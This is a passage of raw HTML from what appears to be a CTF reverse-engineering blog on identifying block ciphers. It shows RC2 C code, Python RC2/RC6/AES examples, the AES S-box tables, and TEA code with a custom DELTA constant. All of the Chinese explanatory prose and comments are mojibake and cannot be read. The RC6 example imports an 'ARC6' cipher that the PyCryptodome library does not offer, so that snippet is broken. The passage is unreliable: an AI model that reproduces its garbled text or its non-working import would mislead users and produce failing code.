class="number">6</span>];</span><br><span class="line">    x54 = (plain[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">4</span>];</span><br><span class="line">    x32 = (plain[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">2</span>];</span><br><span class="line">    x10 = (plain[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j + 1;</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] rol s[i];</span></span><br><span class="line">        x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line">        x10 = (x10 &lt;&lt; <span class="number">1</span>) + (x10 &gt;&gt; <span class="number">15</span> &amp; <span class="number">1</span>);</span><br><span class="line">        x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">2</span>) + (x32 &gt;&gt; <span class="number">14</span> &amp; <span class="number">3</span>);</span><br><span class="line">        x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">3</span>) + (x54 &gt;&gt; <span class="number">13</span> &amp; <span class="number">7</span>);</span><br><span class="line">        x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">5</span>) + (x76 &gt;&gt; <span class="number">11</span> &amp; <span class="number">31</span>);</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span> || i == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x10 += xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 += xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 += xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x76 += xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher[<span class="number">0</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x10;</span><br><span class="line">    cipher[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">2</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x32;</span><br><span class="line">    cipher[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">4</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x54;</span><br><span class="line">    cipher[<span class="number">5</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">6</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)x76;</span><br><span class="line">    cipher[<span class="number">7</span>] = (<span class="type">unsigned</span> <span class="type">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rc5">rc5</h3><h3 id="rc6">rc6</h3><h2 id="IO-3">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc2_encrypt</span>(<span class="params">key, plaintext, iv=<span class="literal">None</span>, mode=ARC2.MODE_CBC</span>):</span><br><span class="line">    <span class="keyword">if</span> iv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        iv = get_random_bytes(<span class="number">8</span>)  <span class="comment"># RC2çš„IVé€šå¸¸ä¸º8å­—èŠ‚</span></span><br><span class="line">    cipher = ARC2.new(key, mode, iv)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(plaintext, ARC2.block_size))</span><br><span class="line">    <span class="keyword">return</span> iv + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc2_decrypt</span>(<span class="params">key, ciphertext, mode=ARC2.MODE_CBC</span>):</span><br><span class="line">    iv = ciphertext[:<span class="number">8</span>]</span><br><span class="line">    cipher = ARC2.new(key, mode, iv)</span><br><span class="line">    plaintext = unpad(cipher.decrypt(ciphertext[<span class="number">8</span>:]), ARC2.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ç”¨æ³•</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># RC2å¯†é’¥é•¿åº¦å¯å˜ï¼ˆé€šå¸¸8-128ä½ï¼‰</span></span><br><span class="line">data = <span class="string">b&quot;Hello, RC2!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted = rc2_encrypt(key, data)</span><br><span class="line">decrypted = rc2_decrypt(key, encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RC2 Decrypted: <span class="subst">&#123;decrypted.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########################### rc6ï¼š</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC6</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc6_encrypt</span>(<span class="params">key, plaintext, iv=<span class="literal">None</span>, mode=ARC6.MODE_CBC</span>):</span><br><span class="line">    <span class="keyword">if</span> iv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        iv = get_random_bytes(<span class="number">16</span>)  <span class="comment"># RC6çš„IVé€šå¸¸ä¸º16å­—èŠ‚</span></span><br><span class="line">    cipher = ARC6.new(key, mode, iv)</span><br><span class="line">    ciphertext = cipher.encrypt(pad(plaintext, ARC6.block_size))</span><br><span class="line">    <span class="keyword">return</span> iv + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc6_decrypt</span>(<span class="params">key, ciphertext, mode=ARC6.MODE_CBC</span>):</span><br><span class="line">    iv = ciphertext[:<span class="number">16</span>]</span><br><span class="line">    cipher = ARC6.new(key, mode, iv)</span><br><span class="line">    plaintext = unpad(cipher.decrypt(ciphertext[<span class="number">16</span>:]), ARC6.block_size)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹ç”¨æ³•</span></span><br><span class="line">key = get_random_bytes(<span class="number">32</span>)  <span class="comment"># RC6æ”¯æŒ16/24/32å­—èŠ‚å¯†é’¥</span></span><br><span class="line">data = <span class="string">b&quot;Hello, RC6!&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted = rc6_encrypt(key, data)</span><br><span class="line">decrypted = rc6_decrypt(key, encrypted)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RC6 Decrypted: <span class="subst">&#123;decrypted.decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>AES</h1><h2 id="è¯†åˆ«-4">è¯†åˆ«</h2><p>è€ç”Ÿå¸¸è°ˆï¼Œæ ‡å‡†AESçš„è¯†åˆ«å°±æ˜¯å…¶ç‹¬æœ‰çš„Sç›’å†…å®¹ã€‚å…¶Sç›’å’Œé€†Sç›’æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 63 7c 77 7b f2 6b 6f c5 30  1 67 2b fe d7 ab 76</span><br><span class="line">1 ca 82 c9 7d fa 59 47 f0 ad d4 a2 af 9c a4 72 c0</span><br><span class="line">2 b7 fd 93 26 36 3f f7 cc 34 a5 e5 f1 71 d8 31 15</span><br><span class="line">3  4 c7 23 c3 18 96  5 9a  7 12 80 e2 eb 27 b2 75</span><br><span class="line">4  9 83 2c 1a 1b 6e 5a a0 52 3b d6 b3 29 e3 2f 84</span><br><span class="line">5 53 d1  0 ed 20 fc b1 5b 6a cb be 39 4a 4c 58 cf</span><br><span class="line">6 d0 ef aa fb 43 4d 33 85 45 f9  2 7f 50 3c 9f a8</span><br><span class="line">7 51 a3 40 8f 92 9d 38 f5 bc b6 da 21 10 ff f3 d2</span><br><span class="line">8 cd  c 13 ec 5f 97 44 17 c4 a7 7e 3d 64 5d 19 73</span><br><span class="line">9 60 81 4f dc 22 2a 90 88 46 ee b8 14 de 5e  b db</span><br><span class="line">a e0 32 3a  a 49  6 24 5c c2 d3 ac 62 91 95 e4 79</span><br><span class="line">b e7 c8 37 6d 8d d5 4e a9 6c 56 f4 ea 65 7a ae  8</span><br><span class="line">c ba 78 25 2e 1c a6 b4 c6 e8 dd 74 1f 4b bd 8b 8a</span><br><span class="line">d 70 3e b5 66 48  3 f6  e 61 35 57 b9 86 c1 1d 9e</span><br><span class="line">e e1 f8 98 11 69 d9 8e 94 9b 1e 87 e9 ce 55 28 df</span><br><span class="line">f 8c a1 89  d bf e6 42 68 41 99 2d  f b0 54 bb 16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0 52  9 6a d5 30 36 a5 38 bf 40 a3 9e 81 f3 d7 fb</span><br><span class="line">1 7c e3 39 82 9b 2f ff 87 34 8e 43 44 c4 de e9 cb</span><br><span class="line">2 54 7b 94 32 a6 c2 23 3d ee 4c 95  b 42 fa c3 4e</span><br><span class="line">3  8 2e a1 66 28 d9 24 b2 76 5b a2 49 6d 8b d1 25</span><br><span class="line">4 72 f8 f6 64 86 68 98 16 d4 a4 5c cc 5d 65 b6 92</span><br><span class="line">5 6c 70 48 50 fd ed b9 da 5e 15 46 57 a7 8d 9d 84</span><br><span class="line">6 90 d8 ab  0 8c bc d3  a f7 e4 58  5 b8 b3 45  6</span><br><span class="line">7 d0 2c 1e 8f ca 3f  f  2 c1 af bd  3  1 13 8a 6b</span><br><span class="line">8 3a 91 11 41 4f 67 dc ea 97 f2 cf ce f0 b4 e6 73</span><br><span class="line">9 96 ac 74 22 e7 ad 35 85 e2 f9 37 e8 1c 75 df 6e</span><br><span class="line">a 47 f1 1a 71 1d 29 c5 89 6f b7 62  e aa 18 be 1b</span><br><span class="line">b fc 56 3e 4b c6 d2 79 20 9a db c0 fe 78 cd 5a f4</span><br><span class="line">c 1f dd a8 33 88  7 c7 31 b1 12 10 59 27 80 ec 5f</span><br><span class="line">d 60 51 7f a9 19 b5 4a  d 2d e5 7a 9f 93 c9 9c ef</span><br><span class="line">e a0 e0 3b 4d ae 2a f5 b0 c8 eb bb 3c 83 53 99 61</span><br><span class="line">f 17 2b  4 7e ba 77 d6 26 e1 69 14 63 55 21  c 7d</span><br></pre></td></tr></table></figure><p>å‰4ä¸ªå­—èŠ‚å°±å¤Ÿäº†ï¼Œsearchä¸€ä¸‹å‘ç°äº†åŸºæœ¬100%æ˜¯AESã€‚ç›¸å…³å‡½æ•°å…¨è·³è¿‡å°±è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[æ˜æ–‡] --&gt;|åˆ†ç»„| B[åˆå§‹è½®å¯†é’¥åŠ ]</span><br><span class="line">    B --&gt; C[è½®å‡½æ•°]</span><br><span class="line">    C --&gt;|é‡å¤Nr-1æ¬¡| D[æœ€ç»ˆè½®]</span><br><span class="line">    D --&gt; E[å¯†æ–‡]</span><br><span class="line"></span><br><span class="line">    subgraph è½®å‡½æ•°</span><br><span class="line">        C1[å­—èŠ‚ä»£æ¢] --&gt; C2[è¡Œç§»ä½]</span><br><span class="line">        C2 --&gt; C3[åˆ—æ··æ·†]</span><br><span class="line">        C3 --&gt; C4[è½®å¯†é’¥åŠ ]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    subgraph æœ€ç»ˆè½®</span><br><span class="line">        D1[å­—èŠ‚ä»£æ¢] --&gt; D2[è¡Œç§»ä½]</span><br><span class="line">        D2 --&gt; D3[è½®å¯†é’¥åŠ ]</span><br><span class="line">    end</span><br></pre></td></tr></table></figure><p>å¯èƒ½æœ‰é­”æ”¹ï¼Œå¦‚æœè¯†åˆ«ç®—æ³•çš„è¯é‡ç‚¹åœ¨ä»¥ä¸‹ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>åˆå§‹åŒ–16*11å¤§å°çš„æ‰©å±•å¯†é’¥ï¼ˆå…¶ä¸­ç¬¬ä¸€ä¸ª16å­—èŠ‚åŒ…å«åŸå§‹ç§˜é’¥ï¼Œæ¯4å­—èŠ‚é¢ å€’ï¼Œå³abcdabcd-&gt;dcbadcbaï¼‰</p></li><li class="lvl-2"><p>è¡Œç§»ä½å’Œåˆ—æ··åˆç®—æ³•çš„ç‰¹å¾</p></li></ul><h2 id="IO-4">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªéšæœºå¯†é’¥</span></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># AES-128</span></span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)   <span class="comment"># åˆå§‹åŒ–å‘é‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–AESåŠ å¯†å™¨</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ å¯†æ•°æ®</span></span><br><span class="line">data = <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">padded_data = pad(data.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)</span><br><span class="line">encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;encrypted_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–AESè§£å¯†å™¨</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†æ•°æ®</span></span><br><span class="line">decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;decrypted_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1>TEA</h1><p>ç›®å‰æ²¡é‡è§è¿‡ï¼Œåªèƒ½æŠ„äº†</p><p>teaä¹Ÿæ˜¯ä¸€ä¸ªç®€å•çš„å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œåˆå§‹åŒ–ä¸€ä¸ª128ä½å¯†é’¥ï¼ŒæŒ‰64ä½åˆ†ç»„å¤„ç†æ˜æ–‡ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªmagic_number DELTAï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9981abcd</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123; <span class="comment">//è¿›è¡Œ32æ¬¡è¿­ä»£åŠ å¯†ï¼ŒTeaç®—æ³•ä½œè€…çš„å»ºè®®è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">    l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += DELTA; <span class="comment">//ç´¯åŠ Deltaçš„å€¼</span></span><br><span class="line">    r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]); <span class="comment">//åˆ©ç”¨å¤šæ¬¡åŒä½ç§»å’Œå¼‚æˆ–å°†æ˜æ–‡ä¸å¯†é’¥æ‰©æ•£æ··ä¹±ï¼Œå¹¶å°†ä¸¤ä¸ªæ˜æ–‡äº’ç›¸åŠ å¯†</span></span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tea_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">unsigned</span> <span class="type">int</span>* key)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line">  sum = DELTA * <span class="number">32</span>; <span class="comment">//32æ¬¡è¿­ä»£ç´¯åŠ ådeltaçš„å€¼</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    sum -= DELTA;</span><br><span class="line">    l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key1[<span class="number">4</span>]=&#123;<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0x78591fad</span>&#125;;<span class="comment">//key1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x78591fad</span>,<span class="number">0x6dbcc2bc</span>,<span class="number">0xa3eeb7be</span>,<span class="number">0x50e7de9a</span>&#125;;<span class="comment">//key2</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1[<span class="number">2</span>] = &#123;<span class="number">0x556E2853</span>,<span class="number">0x4393DF16</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2[<span class="number">2</span>] = &#123;<span class="number">0x1989FB2B</span>,<span class="number">0x83F5A243</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//encrypt(v1,key1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v1[0],v1[1]);</span></span><br><span class="line">    <span class="comment">//encrypt(v2,key2);</span></span><br><span class="line">    <span class="comment">//printf(&quot;tea_encrypt:%x %x\n&quot;,v2[0],v2[1]);</span></span><br><span class="line">    tea_decrypt(v1,key1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v1[<span class="number">0</span>],v1[<span class="number">1</span>]);</span><br><span class="line">    tea_decrypt(v2,key2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tea_decrypt:%x %x\n&quot;</span>,v2[<span class="number">0</span>],v2[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tea_decrypt:c0cacd59 38bb7623</span></span><br><span class="line"><span class="comment">//tea_decrypt:8757d16 a520cece</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­é»˜è®¤çš„DELTAä¸€èˆ¬ä¸º 0x9e3779b9 æˆ–è€… 0x61c88647ï¼ˆåˆ†åˆ«æ˜¯åŠ å’Œå‡ï¼Œå…¶å®å½±å“æ˜¯ç­‰ä»·çš„ï¼‰</p><p>é­”æ”¹ç®—æ³•ä¸€èˆ¬ä¼šä¿®æ”¹è¿™ä¸ªDELTAå€¼ï¼Œä¸è¿‡è¯†åˆ«ä¹Ÿå¾ˆå®¹æ˜“ï¼Œè¿™ä¸ªå€¼å¤ªå­¤ç«‹äº†ã€‚é™¤äº†DELTAï¼Œè¿˜æœ‰ä¸€ä¸ªè¯†åˆ«å…³é”®åœ¨äºåŠ å¯†å¾ªç¯æ˜¯32æ¬¡ã€‚</p><p>è¿˜æœ‰ä¸€äº›é­”æ”¹ä¼šåœ¨æ¯è½®è¿­ä»£ä¸­æ·»åŠ å¯é€†è¿ç®—ï¼Œä»¥åŠè¿­ä»£å®Œæ¯•èµ‹å€¼æ—¶æ·»åŠ å¯é€†è¿ç®—ã€‚</p><h2 id="IO-5">IO</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">DELTA = <span class="number">0x9981abcd</span>  <span class="comment"># è‡ªå®šä¹‰ DELTA å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_encrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):  <span class="comment"># è¿›è¡Œ32æ¬¡è¿­ä»£åŠ å¯†</span></span><br><span class="line">        l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>]) <span class="comment"># é­”æ”¹1ï¼šl+=xxx ^ (sum+i)ï¼Œè¦æ±‚è§£å¯†^(sum+(31-i)</span></span><br><span class="line">        <span class="built_in">sum</span> += DELTA</span><br><span class="line">        r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">return</span> [l, r] <span class="comment"># é­”æ”¹ç‚¹2ï¼šreturn[l^v1,r^v2]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">v, key</span>):</span><br><span class="line">    l, r = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">sum</span> = DELTA * <span class="number">32</span>  <span class="comment"># 32æ¬¡è¿­ä»£ç´¯åŠ ådeltaçš„å€¼</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + 